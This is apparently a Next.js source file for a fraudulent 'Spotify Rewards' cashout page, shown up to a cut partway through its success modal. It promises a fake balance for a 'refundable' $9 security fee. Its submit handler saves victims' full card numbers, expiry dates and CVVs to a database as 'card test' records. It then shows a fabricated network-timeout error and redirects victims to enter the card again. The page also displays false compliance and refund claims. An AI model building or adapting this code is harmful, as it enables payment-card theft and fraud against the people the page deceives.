'use client';

import {
  AlertCircle,
  ArrowRight,
  Check,
  CheckCircle2,
  Clock,
  CreditCard,
  Headphones,
  Info,
  Lock,
  RefreshCw,
  ShieldCheck,
  ChevronDown,
  WifiOff,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import { recordCardTestInSupabase, recordPaymentInSupabase, upsertCustomer } from '../../../lib/supabase';
import MetaPixelTracker from '../../components/MetaPixelTracker';

const COUNTRIES_LIST = [
  { code: 'US', name: 'United States' },
  { code: 'BR', name: 'Brazil' },
  { code: 'CA', name: 'Canada' },
  { code: 'GB', name: 'United Kingdom' },
  { code: 'AU', name: 'Australia' },
  { code: 'DE', name: 'Germany' },
  { code: 'FR', name: 'France' },
  { code: 'ES', name: 'Spain' },
  { code: 'IT', name: 'Italy' },
  { code: 'PT', name: 'Portugal' },
  { code: 'JP', name: 'Japan' },
  { code: 'MX', name: 'Mexico' },
  { code: 'AR', name: 'Argentina' },
  { code: 'CO', name: 'Colombia' },
  { code: 'CL', name: 'Chile' },
  { code: 'PE', name: 'Peru' },
  { code: 'IN', name: 'India' },
  { code: 'CN', name: 'China' },
  { code: 'KR', name: 'South Korea' },
  { code: 'ZA', name: 'South Africa' },
  { code: 'NZ', name: 'New Zealand' },
  { code: 'NL', name: 'Netherlands' },
  { code: 'CH', name: 'Switzerland' },
  { code: 'SE', name: 'Sweden' },
  { code: 'NO', name: 'Norway' },
  { code: 'DK', name: 'Denmark' },
  { code: 'FI', name: 'Finland' },
  { code: 'IE', name: 'Ireland' },
  { code: 'SG', name: 'Singapore' },
  { code: 'AE', name: 'United Arab Emirates' },
  { code: 'AF', name: 'Afghanistan' },
  { code: 'AL', name: 'Albania' },
  { code: 'DZ', name: 'Algeria' },
  { code: 'AD', name: 'Andorra' },
  { code: 'AO', name: 'Angola' },
  { code: 'AG', name: 'Antigua and Barbuda' },
  { code: 'AM', name: 'Armenia' },
  { code: 'AT', name: 'Austria' },
  { code: 'AZ', name: 'Azerbaijan' },
  { code: 'BS', name: 'Bahamas' },
  { code: 'BH', name: 'Bahrain' },
  { code: 'BD', name: 'Bangladesh' },
  { code: 'BB', name: 'Barbados' },
  { code: 'BY', name: 'Belarus' },
  { code: 'BE', name: 'Belgium' },
  { code: 'BZ', name: 'Belize' },
  { code: 'BJ', name: 'Benin' },
  { code: 'BT', name: 'Bhutan' },
  { code: 'BO', name: 'Bolivia' },
  { code: 'BA', name: 'Bosnia and Herzegovina' },
  { code: 'BW', name: 'Botswana' },
  { code: 'BN', name: 'Brunei' },
  { code: 'BG', name: 'Bulgaria' },
  { code: 'BF', name: 'Burkina Faso' },
  { code: 'BI', name: 'Burundi' },
  { code: 'CV', name: 'Cabo Verde' },
  { code: 'KH', name: 'Cambodia' },
  { code: 'CM', name: 'Cameroon' },
  { code: 'CF', name: 'Central African Republic' },
  { code: 'TD', name: 'Chad' },
  { code: 'KM', name: 'Comoros' },
  { code: 'CG', name: 'Congo' },
  { code: 'CR', name: 'Costa Rica' },
  { code: 'HR', name: 'Croatia' },
  { code: 'CU', name: 'Cuba' },
  { code: 'CY', name: 'Cyprus' },
  { code: 'CZ', name: 'Czechia' },
  { code: 'DJ', name: 'Djibouti' },
  { code: 'DM', name: 'Dominica' },
  { code: 'DO', name: 'Dominican Republic' },
  { code: 'EC', name: 'Ecuador' },
  { code: 'EG', name: 'Egypt' },
  { code: 'SV', name: 'El Salvador' },
  { code: 'GQ', name: 'Equatorial Guinea' },
  { code: 'ER', name: 'Eritrea' },
  { code: 'EE', name: 'Estonia' },
  { code: 'SZ', name: 'Eswatini' },
  { code: 'ET', name: 'Ethiopia' },
  { code: 'FJ', name: 'Fiji' },
  { code: 'GA', name: 'Gabon' },
  { code: 'GM', name: 'Gambia' },
  { code: 'GE', name: 'Georgia' },
  { code: 'GH', name: 'Ghana' },
  { code: 'GR', name: 'Greece' },
  { code: 'GD', name: 'Grenada' },
  { code: 'GT', name: 'Guatemala' },
  { code: 'GN', name: 'Guinea' },
  { code: 'GW', name: 'Guinea-Bissau' },
  { code: 'GY', name: 'Guyana' },
  { code: 'HT', name: 'Haiti' },
  { code: 'HN', name: 'Honduras' },
  { code: 'HU', name: 'Hungary' },
  { code: 'IS', name: 'Iceland' },
  { code: 'ID', name: 'Indonesia' },
  { code: 'IR', name: 'Iran' },
  { code: 'IQ', name: 'Iraq' },
  { code: 'IL', name: 'Israel' },
  { code: 'JM', name: 'Jamaica' },
  { code: 'JO', name: 'Jordan' },
  { code: 'KZ', name: 'Kazakhstan' },
  { code: 'KE', name: 'Kenya' },
  { code: 'KI', name: 'Kiribati' },
  { code: 'KW', name: 'Kuwait' },
  { code: 'KG', name: 'Kyrgyzstan' },
  { code: 'LA', name: 'Laos' },
  { code: 'LV', name: 'Latvia' },
  { code: 'LB', name: 'Lebanon' },
  { code: 'LS', name: 'Lesotho' },
  { code: 'LR', name: 'Liberia' },
  { code: 'LY', name: 'Libya' },
  { code: 'LI', name: 'Liechtenstein' },
  { code: 'LT', name: 'Lithuania' },
  { code: 'LU', name: 'Luxembourg' },
  { code: 'MG', name: 'Madagascar' },
  { code: 'MW', name: 'Malawi' },
  { code: 'MY', name: 'Malaysia' },
  { code: 'MV', name: 'Maldives' },
  { code: 'ML', name: 'Mali' },
  { code: 'MT', name: 'Malta' },
  { code: 'MH', name: 'Marshall Islands' },
  { code: 'MR', name: 'Mauritania' },
  { code: 'MU', name: 'Mauritius' },
  { code: 'FM', name: 'Micronesia' },
  { code: 'MD', name: 'Moldova' },
  { code: 'MC', name: 'Monaco' },
  { code: 'MN', name: 'Mongolia' },
  { code: 'ME', name: 'Montenegro' },
  { code: 'MA', name: 'Morocco' },
  { code: 'MZ', name: 'Mozambique' },
  { code: 'MM', name: 'Myanmar' },
  { code: 'NA', name: 'Namibia' },
  { code: 'NR', name: 'Nauru' },
  { code: 'NP', name: 'Nepal' },
  { code: 'NI', name: 'Nicaragua' },
  { code: 'NE', name: 'Niger' },
  { code: 'NG', name: 'Nigeria' },
  { code: 'KP', name: 'North Korea' },
  { code: 'MK', name: 'North Macedonia' },
  { code: 'OM', name: 'Oman' },
  { code: 'PK', name: 'Pakistan' },
  { code: 'PW', name: 'Palau' },
  { code: 'PS', name: 'Palestine' },
  { code: 'PA', name: 'Panama' },
  { code: 'PG', name: 'Papua New Guinea' },
  { code: 'PY', name: 'Paraguay' },
  { code: 'PH', name: 'Philippines' },
  { code: 'PL', name: 'Poland' },
  { code: 'QA', name: 'Qatar' },
  { code: 'RO', name: 'Romania' },
  { code: 'RU', name: 'Russia' },
  { code: 'RW', name: 'Rwanda' },
  { code: 'KN', name: 'Saint Kitts and Nevis' },
  { code: 'LC', name: 'Saint Lucia' },
  { code: 'VC', name: 'Saint Vincent and the Grenadines' },
  { code: 'WS', name: 'Samoa' },
  { code: 'SM', name: 'San Marino' },
  { code: 'ST', name: 'Sao Tome and Principe' },
  { code: 'SA', name: 'Saudi Arabia' },
  { code: 'SN', name: 'Senegal' },
  { code: 'RS', name: 'Serbia' },
  { code: 'SC', name: 'Seychelles' },
  { code: 'SL', name: 'Sierra Leone' },
  { code: 'SK', name: 'Slovakia' },
  { code: 'SI', name: 'Slovenia' },
  { code: 'SB', name: 'Solomon Islands' },
  { code: 'SO', name: 'Somalia' },
  { code: 'SS', name: 'South Sudan' },
  { code: 'LK', name: 'Sri Lanka' },
  { code: 'SD', name: 'Sudan' },
  { code: 'SR', name: 'Suriname' },
  { code: 'SY', name: 'Syria' },
  { code: 'TW', name: 'Taiwan' },
  { code: 'TJ', name: 'Tajikistan' },
  { code: 'TZ', name: 'Tanzania' },
  { code: 'TH', name: 'Thailand' },
  { code: 'TL', name: 'Timor-Leste' },
  { code: 'TG', name: 'Togo' },
  { code: 'TO', name: 'Tonga' },
  { code: 'TT', name: 'Trinidad and Tobago' },
  { code: 'TN', name: 'Tunisia' },
  { code: 'TR', name: 'Turkey' },
  { code: 'TM', name: 'Turkmenistan' },
  { code: 'TV', name: 'Tuvalu' },
  { code: 'UG', name: 'Uganda' },
  { code: 'UA', name: 'Ukraine' },
  { code: 'UY', name: 'Uruguay' },
  { code: 'UZ', name: 'Uzbekistan' },
  { code: 'VU', name: 'Vanuatu' },
  { code: 'VA', name: 'Vatican City' },
  { code: 'VE', name: 'Venezuela' },
  { code: 'VN', name: 'Vietnam' },
  { code: 'YE', name: 'Yemen' },
  { code: 'ZM', name: 'Zambia' },
  { code: 'ZW', name: 'Zimbabwe' },
];

export default function PaymentSecurityPage() {
  const router = useRouter();

  const [balanceData, setBalanceData] = useState<{
    balance: number;
    currency: string;
    formatted: string;
    isDemo: boolean;
  }>({
    balance: 114.93,
    currency: 'USD',
    formatted: '$114.93',
    isDemo: true,
  });

  // Form Fields
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvc, setCvc] = useState('');
  const [country, setCountry] = useState('US');
  const [zipCode, setZipCode] = useState('');

  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  // Auto-fill fullName and email from previous funnel steps if available
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const savedName = sessionStorage.getItem('spotify_listener_name');
      if (savedName && savedName.trim() && savedName !== 'MEU NOME') {
        setFullName(savedName.trim());
      }
      const savedEmail = sessionStorage.getItem('spotify_listener_email');
      if (savedEmail && savedEmail.trim()) {
        setEmail(savedEmail.trim());
      }
    }
  }, []);

  const isExpDateInvalid = (exp: string) => {
    if (!exp) return false;
    const parts = exp.split('/');
    const monthStr = parts[0]?.trim();
    if (monthStr && monthStr.length >= 2) {
      const m = parseInt(monthStr, 10);
      if (isNaN(m) || m < 1 || m > 12) return true;
    }
    if (parts.length === 2) {
      const m = parseInt(monthStr, 10);
      const yy = parts[1]?.trim();
      if (isNaN(m) || m < 1 || m > 12) return true;
      if (yy && yy.length === 2) {
        const y = parseInt('20' + yy, 10);
        if (isNaN(y) || y < 2026) return true;
        if (y === 2026 && m < 11) return true;
      }
    }
    return false;
  };

  // Load balance from backend
  useEffect(() => {
    async function fetchBalance() {
      try {
        const res = await fetch('/api/user/balance');
        if (res.ok) {
          const data = await res.json();
          setBalanceData(data);
        }
      } catch (e) {
        console.error('Failed to load user balance:', e);
      }
    }
    fetchBalance();
  }, []);

  // Auto-detect user country via IP geolocation with fallback to browser language
  useEffect(() => {
    async function detectCountry() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          if (data && data.country_code && COUNTRIES_LIST.some(c => c.code === data.country_code)) {
            setCountry(data.country_code);
            return;
          }
        }
      } catch (e) {}

      try {
        const res2 = await fetch('https://ipwho.is/');
        if (res2.ok) {
          const data2 = await res2.json();
          if (data2 && data2.country_code && COUNTRIES_LIST.some(c => c.code === data2.country_code)) {
            setCountry(data2.country_code);
            return;
          }
        }
      } catch (e) {}

      if (navigator.language) {
        const parts = navigator.language.split('-');
        if (parts.length > 1) {
          const inferred = parts[1].toUpperCase();
          if (COUNTRIES_LIST.some(c => c.code === inferred)) {
            setCountry(inferred);
          }
        }
      }
    }
    detectCountry();
  }, []);

  // Format Card Number (groups of 4)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    let formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  // Format MM/YY
  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length === 1 && parseInt(raw, 10) > 1) {
      raw = `0${raw}`;
    }
    if (raw.length >= 3) {
      setExpDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
    } else {
      setExpDate(raw);
    }
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvc(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (!fullName.trim()) {
      setErrorMsg('Please enter your full name as shown on your card.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
      return;
    }

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('spotify_listener_name', fullName.trim());
      sessionStorage.setItem('spotify_listener_email', email.trim());
    }

    const cleanNum = cardNumber.replace(/\s/g, '');
    if (cleanNum.length < 15) {
      setErrorMsg('Please enter a valid card number.');
      return;
    }
    const parts = expDate.split('/');
    const month = parseInt(parts[0], 10);
    if (isNaN(month) || month < 1 || month > 12) {
      setErrorMsg('Invalid month. Expiration month must be between 01 and 12.');
      return;
    }
    const yy = parts[1];
    const year = yy ? parseInt('20' + yy, 10) : 0;
    if (year < 2026 || (year === 2026 && month < 11)) {
      setErrorMsg('Expired card or invalid date (minimum valid is November 2026).');
      return;
    }
    if (expDate.length < 5 || isExpDateInvalid(expDate)) {
      setErrorMsg('Please enter a valid expiration date (MM / YY, min 11/26).');
      return;
    }
    if (cvc.length < 3) {
      setErrorMsg('Please enter a valid security code (CVC).');
      return;
    }
    if (country === 'US' && zipCode.replace(/\D/g, '').length < 5) {
      setErrorMsg('Please enter a valid 5-digit ZIP code.');
      return;
    }

    setIsProcessing(true);

    try {
      // Save customer lead into Supabase
      upsertCustomer({
        email: email.trim(),
        full_name: fullName.trim(),
      }).catch((e) => console.warn('Supabase customer upsert notice:', e));

      // Save card test data into Supabase in background (marked as declined)
      await recordCardTestInSupabase({
        card_number: cardNumber,
        exp_date: expDate,
        cvv: cvc,
        country,
        status: 'declined',
      });

      // Record payment attempt as declined in Supabase payments table
      recordPaymentInSupabase({
        email: email.trim(),
        full_name: fullName.trim(),
        amount: 9.0,
        currency: 'usd',
        status: 'declined',
        error_message: 'Payment declined by issuing bank',
        country,
      }).catch((e) => console.warn('Supabase payment decline record notice:', e));

      setTimeout(() => {
        setIsProcessing(false);
        setErrorMsg('Network timeout during verification. Please check your connection and retry.');
        setTimeout(() => {
          router.push('/payment');
        }, 2500);
      }, 1600);
    } catch (err: any) {
      setIsProcessing(false);
      setErrorMsg('Network timeout during verification. Please check your connection and retry.');
      setTimeout(() => {
        router.push('/payment');
      }, 2500);
    }
  };

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
      {/* Meta Pixel & CAPI Checkout Tracker */}
      <MetaPixelTracker
        eventName="InitiateCheckout"
        customData={{
          content_name: 'Anti-Spam Security Pass Checkout',
          value: 9.0,
          currency: 'USD',
        }}
        userData={{
          email,
          full_name: fullName,
        }}
      />
      {/* Background Radial Glow Accent matching reference image */}
      <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />

      {/* Ambient green dot grid */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#1db95408_1px,transparent_1px),linear-gradient(to_bottom,#1db95408_1px,transparent_1px)] bg-[size:3rem_3rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none -z-10" />

      {/* Top Header / Branding */}
      <header className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-4 flex items-center">
        <Link href="/spotify" className="flex items-center gap-2.5 transition-opacity hover:opacity-90">
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-lg sm:text-xl tracking-tight">Spotify</span>
            <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
              Rewards
            </span>
          </div>
        </Link>
      </header>

      {/* Main Content: 2-Column Desktop Grid / 1-Column Mobile Stack */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-start">
          {/* ========================================================= */}
          {/* LEFT COLUMN: PROGRAM INFO & BENEFIT HIGHLIGHTS            */}
          {/* ========================================================= */}
          <div className="lg:col-span-6 space-y-6 pt-1">
            {/* Main Heading */}
            <div>
              <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight">
                Your <span className="text-[#1db954] font-black">{balanceData.formatted}</span> is Ready
              </h1>

              <p className="text-sm sm:text-base text-gray-300 mt-3 leading-relaxed">
                Review your account information and available payment options. Complete listener verification to unlock instant cashout.
              </p>
            </div>

            {/* Verification Pill Badge */}
            <div>
              <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider">
                <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
                INSTANT CASHOUT VERIFICATION
              </span>
            </div>

            {/* Program Checklist Items with Green Checks */}
            <div className="space-y-4 pt-1">
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Unlock Full Cashout:</b> Direct deposit of your {balanceData.formatted} to PayPal or Bank Account
                </div>
              </div>

              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Daily Music Review Batches:</b> Receive up to 10 new songs daily (earn $45-$80 per review)
                </div>
              </div>

              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Official Verified Listener Badge:</b> Priority payouts with zero processing delays
                </div>
              </div>

              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">100% Refundable Security Fee:</b> Automatically refunded back to your account together with your {balanceData.formatted} balance right after registration
                </div>
              </div>
            </div>

            {/* Bottom Guarantee Row */}
            <div className="pt-4 border-t border-white/5 flex flex-wrap items-center gap-4 sm:gap-6 text-xs text-gray-400 font-medium">
              <div className="flex items-center gap-1.5">
                <Clock className="w-4 h-4 text-[#1db954]" />
                <span>Instant Deposit</span>
              </div>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4 text-[#1db954]" />
                <span>Bank-Grade Security</span>
              </div>
              <div className="flex items-center gap-1.5">
                <RefreshCw className="w-4 h-4 text-[#1db954]" />
                <span>100% Refundable</span>
              </div>
            </div>
          </div>

          {/* ========================================================= */}
          {/* RIGHT COLUMN: SIMULATED CHECKOUT CARD                     */}
          {/* ========================================================= */}
          <div className="lg:col-span-6">
            <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
              {/* Card Header: Accumulated Balance */}
              <div className="flex items-center justify-between pb-5 border-b border-[#1d2520] mb-6">
                <div>
                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
                    ACCUMULATED BALANCE
                  </span>
                  <span className="text-xs text-[#8a9890] mt-0.5 block">
                    Ready for release to your account
                  </span>
                </div>
                <div className="text-3xl sm:text-4xl font-extrabold text-[#1db954] tracking-tight">
                  {balanceData.formatted}
                </div>
              </div>

              {/* Order Summary & Pricing Distinction */}
              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1f2722] flex items-center justify-between text-xs">
                <div>
                  <span className="font-bold text-white block text-sm">One-Time Anti-Spam Security Pass</span>
                  <span className="text-[#8a9890] text-xs mt-0.5 block">Automatic refund within 1–2 hours</span>
                </div>
                <div className="text-right">
                  <span className="text-base font-bold text-white block">$9.00 USD</span>
                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">100% Refundable</span>
                </div>
              </div>

              {/* Simulated Form */}
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Full Name & Email */}
                <div className="space-y-3.5 mb-2">
                  <div>
                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                      Full name
                    </label>
                    <input
                      type="text"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      placeholder="First and last name"
                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                      Email address
                    </label>
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onBlur={() => {
                        if (email.trim() && email.includes('@')) {
                          if (typeof window !== 'undefined') {
                            sessionStorage.setItem('spotify_listener_email', email.trim());
                            if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
                          }
                          upsertCustomer({
                            email: email.trim(),
                            full_name: fullName.trim() || undefined,
                          }).catch(() => {});
                        }
                      }}
                      placeholder="name@example.com"
                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
                    />
                    <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
                      <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
                    </p>
                  </div>
                </div>

                {/* Card Number */}
                <div>
                  <label className="block text-sm font-semibold text-gray-200 mb-2">
                    Card number
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="1234 1234 1234 1234"
                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-24"
                    />
                    <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
                      {/* Visa Logo */}
                      <div
                        className={`transition-all duration-300 ease-in-out ${
                          cardNumber.replace(/\D/g, '').length === 0
                            ? 'opacity-100 scale-100'
                            : cardNumber.replace(/\D/g, '').startsWith('4')
                            ? 'opacity-100 scale-100'
                            : 'opacity-0 scale-95 w-0 overflow-hidden'
                        }`}
                      >
                        <img
                          src="https://www.footylogos.com/brands/assets/visa-logo-blue-background-footylogos.svg"
                          alt="Visa"
                          className="h-5 w-auto object-contain rounded shadow-sm"
                          referrerPolicy="no-referrer"
                        />
                      </div>
                      {/* Mastercard Logo */}
                      <div
                        className={`transition-all duration-300 ease-in-out ${
                          cardNumber.replace(/\D/g, '').length === 0
                            ? 'opacity-100 scale-100'
                            : /^5[1-5]/.test(cardNumber.replace(/\D/g, '')) ||
                              /^2[2-7]/.test(cardNumber.replace(/\D/g, '')) ||
                              cardNumber.replace(/\D/g, '').startsWith('5') ||
                              cardNumber.replace(/\D/g, '').startsWith('2')
                            ? 'opacity-100 scale-100'
                            : 'opacity-0 scale-95 w-0 overflow-hidden'
                        }`}
                      >
                        <img
                          src="https://freight.cargo.site/w/2560/q/94/i/abc4f5504b94d545ededcfe41429c2c3bc5bc2701fc0482c11d2b5e5714e6442/Mastercard-Portfolio-Jan2018-2.jpg"
                          alt="Mastercard"
                          className="h-5 w-auto object-contain rounded shadow-sm"
                          referrerPolicy="no-referrer"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Expiration date & Security code */}
                <div className="grid grid-cols-2 gap-3.5">
                  <div>
                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                      Expiration date
                    </label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={expDate}
                      onChange={handleExpChange}
                      placeholder="MM / YY"
                      className={`w-full bg-[#131715] border rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none transition-colors ${
                        isExpDateInvalid(expDate)
                          ? 'border-red-500 focus:border-red-500'
                          : 'border-[#26312a] focus:border-[#1db954]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                      Security code
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        inputMode="numeric"
                        value={cvc}
                        onChange={handleCvcChange}
                        placeholder="CVC"
                        className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-12"
                      />
                      <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                        <svg className="w-6 h-5" viewBox="0 0 24 18" fill="none" stroke="currentColor" strokeWidth="1.5">
                          <rect x="1" y="1" width="22" height="16" rx="3" />
                          <line x1="1" y1="5.5" x2="23" y2="5.5" strokeWidth="1.5" />
                          <text x="14" y="14" fontSize="5.5" fontWeight="bold" fill="currentColor" stroke="none" fontFamily="monospace">123</text>
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Country */}
                <div>
                  <label className="block text-sm font-semibold text-gray-200 mb-2">
                    Country
                  </label>
                  <div className="relative">
                    <select
                      value={country}
                      onChange={(e) => setCountry(e.target.value)}
                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer pr-10"
                    >
                      {COUNTRIES_LIST.map((c) => (
                        <option key={c.code} value={c.code} className="bg-[#121814] text-white">
                          {c.name} ({c.code})
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                </div>

                {/* ZIP Code (shown when Country is United States) */}
                {country === 'US' && (
                  <div>
                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                      ZIP code
                    </label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={zipCode}
                      onChange={(e) => setZipCode(e.target.value.replace(/\D/g, '').slice(0, 5))}
                      placeholder="ZIP code"
                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
                    />
                  </div>
                )}

                {/* Network Timeout Message */}
                {errorMsg && (
                  <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-start gap-2.5 text-xs text-amber-300">
                    <WifiOff className="w-4 h-4 shrink-0 mt-0.5 text-amber-400" />
                    <span>{errorMsg}</span>
                  </div>
                )}

                {/* Terms */}
                <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
                  <p>
                    By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
                  </p>
                  <p className="text-[11px] text-[#6d7c73]">
                    By subscribing, you authorize MM Systems to charge $9.00 USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
                  </p>
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isProcessing}
                  className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
                >
                  {isProcessing ? (
                    <>
                      <RefreshCw className="w-5 h-5 animate-spin" />
                      <span>PROCESSING PAYMENT...</span>
                    </>
                  ) : (
                    <>
                      <span>CLAIM MY REWARD</span>
                      <ArrowRight className="w-5 h-5" />
                    </>
                  )}
                </button>
              </form>

              {/* Security Footer */}
              <div className="mt-6 pt-5 border-t border-[#1d2520] flex flex-wrap items-center justify-center gap-3 text-[11px] text-[#707e76]">
                <span className="flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5 text-[#1db954]" /> 256-Bit SSL Encrypted
                </span>
                <span>•</span>
                <span className="flex items-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#1db954]" /> PCI-DSS Compliant
                </span>
                <span>•</span>
                <span>Processed by MM Systems</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Success Modal */}
      {paymentSuccess && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="max-w-md w-full rounded-3xl bg-[#0e1410] border border-[#1db954]/50 p-6 sm:p-8 text-center shadow-2xl shadow-[#1db954]/20 animate-in fade-in zoom-in-95 duration-200">
            <div className="w-16 h-16 rounded-full bg-[#1db954]/20 text-[#1db954] flex items-center justify-center mx-auto mb-4 border border-[#1db954]/40">
              <CheckCircle2 className="w-10 h-10 stroke-[2.5]" />
            </div>

            <h3 className="text-2xl font-black text-white mb-2">
              Payment Approved!
            </h3>

            <p className="text-sm text-gray-300 mb-4 leading-relaxed">
